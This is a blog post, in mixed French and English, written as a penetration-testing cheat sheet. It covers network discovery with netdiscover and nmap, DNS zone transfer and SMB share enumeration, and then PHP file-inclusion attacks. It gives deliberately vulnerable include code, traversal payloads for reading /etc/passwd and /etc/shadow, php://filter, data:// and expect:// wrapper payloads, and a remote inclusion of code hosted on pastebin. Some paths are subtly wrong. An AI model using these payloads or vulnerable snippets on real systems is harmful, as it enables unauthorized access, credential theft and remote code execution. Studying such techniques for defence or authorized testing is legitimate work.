---
layout: post
title: "Cheatseet"
author: "fhbapt"
permalink: /cheatseet/
---

## Table of Contents


### [Network](#network)  
 * [Network discovery](#network-discovery)
    * [Netdiscover](#netdiscover) 
    * [Nmap](#nmap)
  * [Services enumerations](#services)
    * [53 - DNS](#dns)
    * [139/445 - SMB](#smb)

### [Web vulnerabilities](#web)
 * [File Inclusion](#file-inclusion)
   * [LFI (Local File Inclusion)](#lfi)
   * [RFI (Remote File Inclusion)](#rfi)

## Common tools for network discovery <a name="network-discovery"></a>
In this chapter, the most common tools and commands use to dicover network architecture are presented. 

### Netdiscover commands <a name="netdiscover"></a>

> Netdiscover is an active/passive arp reconnaissance tool


```netdiscover -p``` Sniffing network trafic, Netdiscover sent anything 


```netdiscover -r 192.168.X.X/24``` Scan of subnetwork 192.168.X.X/24 by sending ARP frames


### Nmap commands <a name="nmap"></a>

```nmap -sL 192.168.X.X/24``` Permet de scanner les hôtes d'un sous réseau

```nmap -sP 192.168.X.X/24``` Lister les hôtes du réseau qui répondent à l'ICMP

```nmap -sU 192.168.X.X``` Scan d'une machine pour lister ses ports ouverts en UDP

```nmap -Pn -A 192.168.X.X(/24) --open``` Scan des machines ou réseau avec la liste des ports ouverts

```nmap -Pn --script=smb-enum-shares -p 445 192.168.X.X```

## Services enumerations <a name="services"></a>

### 53 - DNS <a name="dns"></a>

> Un transfert de zone complet (AXFR) consiste pour un serveur DNS esclave à demander une copie de zone de à un serveur maitre qui le permet. Cette fonctionnalité est reprise par l'attaquant pour découvrir des sous domaines.

Commands DIG :

```dig axfr @dns-server nom-de-domaine``` 

### 139/445 - SMB <a name="smb"></a>

SMB Commands :

```smbclient -U guest //192.168.X.X/share``` Télécharge les fichiers sur un serveur SMB

```smbget -U guest -R smb://192.168.X.X/share ``` Télécharge les fichiers sur un serveur SMB

## File Inclusion <a name="file-inclusion"></a>

### LFI (Local File Inclusion) <a name="lfi"></a>

Vulnérabilité permettant l'inclusion de fichier local.

Exemple de LFI :

```php
<?php @include("./page/".$_GET['page']) ?>
```

**Basic LFI**

```https://fhbapt.github.io/?page=index.php``` Récupération du fichier index.php

```https://fhbapt.github.io/?page=../config.php``` Récupération du fichier config.php

```https://fhbapt.github.io/?page=./../../../etc/password``` Recupération du fichier password

Les fichiers intéressants :
 * /etc/passwd
 * /etc/shadow
 * /etc/hosts
 * /etc/group
 * /proc/cmdline
 * Fichiers de logs
 * Fichiers de backups

**Null Byte, Double encoding**

```https://fhbapt.github.io/?page=etc/password%00``` Null Byte : %00

**Double Encoding**

```https://fhbapt.github.io/?page=%252e%252e%252fetc%252fpasswd```
```https://fhbapt.github.io/?page=%252e%252e%252fetc%252fpasswd%00```

**Wrapper php://filter**

```https://fhbapt.github.io/?page=php://filter/convert.base64-encode/resource=index.php```
```http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php```

**Wrapper data://**

```https://fhbapt.github.io/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==```
La payload est ```<?php phpinfo(); ?>```

**Wrapper expect://**

```https://fhbapt.github.io/?page=expect://ls```

### RFI (Remote File Inclusion) <a name="rfi"></a>

Vulnérabilité permettant l'inclusion de fichier distant.

Exemple de RFI :

```php
<?php @include($_GET['page']) ?>
```

Utilisation de pastbin pour émuler le serveur et inclure le code du pastbin:

```https://fhbapt.github.io/?page=https://pastebin.com/raw/G68SZPQG``` 
